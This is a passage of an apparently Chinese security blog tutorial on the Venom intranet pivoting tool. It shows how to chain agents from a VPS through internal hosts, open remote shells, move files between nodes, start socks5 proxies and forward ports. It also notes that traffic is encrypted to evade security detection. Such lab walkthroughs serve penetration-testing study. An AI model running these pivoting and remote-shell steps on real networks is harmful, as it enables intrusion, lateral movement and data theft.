+<li>现在进行最后一台机器；依次执行命令exit，listen 4343 ；192.168.3.30机器上面已经监听成功了<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882324573234.jpg" alt></li>
+</ul>
+</li>
+<li><p><strong>步骤八</strong></p>
+<ul>
+<li>最后在192.168.3.160机器上面进行连接操作，执行命令：agent.exe -rhost 192.168.3.30 -rport 4343<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882325126648.jpg" alt></li>
+</ul>
+</li>
+<li><p><strong>步骤九</strong></p>
+<ul>
+<li><p>最后回到VPS上面执行show查看一下成功没有；<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882325665062.jpg" alt></p>
+</li>
+<li><p>依次执行命令：goto 3切换到3节点,shell,ipconfig,whoami；可以看到最后成功连接了3.160机器，这个过程就成功了<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882325749470.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p><strong>最后以上监听的端口在节点上面进行listen的时候可以不一致，一台机器上也可以监听多个端口，比如，内网2中有一台机器192.168.3.31，可以和3.30相互访问；</strong><br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882328904539.jpg" alt></p>
+</li>
+<li><p>在节点2基础上面执行3.30本地监听；listen 11111 这里就是不是4343端口了，一样的可以监听成功。<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882329209511.jpg" alt></p>
+</li>
+<li><p>在192.168.3.31上面执行命令:agent.exe -rhost 192.168.3.30 -rport 11111<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882329468536.jpg" alt></p>
+</li>
+<li><p>再回到VPS上面执行show，可以看到新增一个节点4，这个就是192.168.3.31的机器了。<br><img src="/2020/04/30/内网渗透-Venom内网工具使用实战/15882329831610.jpg" alt></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3><span id="0x04-向节点上传从节点下载文件">0x04 向节点上传/从节点下载文件</span></h3><ul>
+<li><p>将node1的文件/tmp/test2.pdf下载到本地的/tmp/test3.pdf</p>
+</li>
+<li><p>将本地/tmp/test.pdf上传到node1的/tmp/test2.pdf</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(node 1) &gt;&gt;&gt; download /tmp/test2.pdf /tmp/test3.pdf</span><br><span class="line">download /tmp/test2.pdf from /tmp/test3.pdf</span><br><span class="line">this file is too large(&gt;100M), still downloading? (y/n)y</span><br><span class="line"> 154.23 MiB / 154.23 MiB [========================================] 100.00% 1s</span><br><span class="line">download file successfully!</span><br><span class="line"></span><br><span class="line">(node 1) &gt;&gt;&gt; upload /tmp/test.pdf /tmp/test2.pdf</span><br><span class="line">upload /tmp/test.pdf to /tmp/test2.pdf</span><br><span class="line">this file is too large(&gt;100M), still uploading? (y/n)y</span><br><span class="line"> 154.23 MiB / 154.23 MiB [========================================] 100.00% 1s</span><br><span class="line">upload file successfully!</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h3><span id="0x05-建立到某节点的socks5代理">0x05 建立到某节点的socks5代理</span></h3><ul>
+<li><p>执行成功socks命令之后，会在admin节点本地开启一个端口，如上述的7777，使用7777即可进行socks5代理</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(node 1) &gt;&gt;&gt; socks 7777</span><br><span class="line">a socks5 proxy of the target node has started up on local port 7777</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3><span id="0x06-将本地端口转发到远程将远程端口转发到本地">0x06 将本地端口转发到远程/将远程端口转发到本地</span></h3><ul>
+<li><p>lforward将admin节点本地的8888端口转发到node1的8888端口</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(node 1) &gt;&gt;&gt; lforward 127.0.0.1 8888 8888</span><br><span class="line">forward local network 127.0.0.1 port 8888 to remote port 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>rforward 将node1网段的192.168.204.103端口8889转发到admin节点本地的8889端口</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rforward 将node1网段的192.168.204.103端口8889转发到admin节点本地的8889端口</span><br><span class="line"></span><br><span class="line">(node 1) &gt;&gt;&gt; rforward 192.168.204.103 8889 8889</span><br><span class="line">forward remote network 192.168.204.103 port 8889 to local port 8889</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<h3><span id="0x07-流量加密传输">0x07 流量加密传输</span></h3><ul>
+<li>对抗安全设备的检测，更好的隐藏自己，所以我们对传输的流量进行加密</li>
+</ul>
+<h3><span id="0x08-参考资料">0x08 参考资料</span></h3><pre><code>https://xz.aliyun.com/t/4058
+
+https://www.pianshen.com/article/9287973165/</code></pre>
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/" title="内网渗透-边界穿透神器（Venom）" target="_blank" rel="external">http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="" target="_blank"><span class="text-dark">VK</span><small class="ml-1x">VK&#39;Blog</small></a></h3>
+        <div>生如蝼蚁，当立鸿鹄之志。命如薄纸，却有不屈之心。乾坤未定，你我皆是黑马，祝你我飞黄腾达前程似锦。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2020/05/01/内网渗透-内网穿透/" title="内网渗透-内网穿透代理"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2020/04/30/内网渗透-边界穿透神器-reprocks/" title="内网渗透-边界穿透神器-reprocks"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+    
+	
+    <ul class="social-links">
+    	
+        <li><a href="http://www.vkxss.top" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="http://www.vkxss.top/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+	<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span >本站总访问量: <span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span >本站访客数: <span id="busuanzi_value_site_uv"></span>人</span>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.min.js"></script>
+<script src="/js/application.js"></script>
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'PUQvavgGf7Y3FXIB68W62St5-gzGzoHsz',
+    appKey: 'OxWOQ95mJtXnKAo9rlYodq2S',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+<script type="text/javascript" src="/js/love.js"></script>
+
+</html>
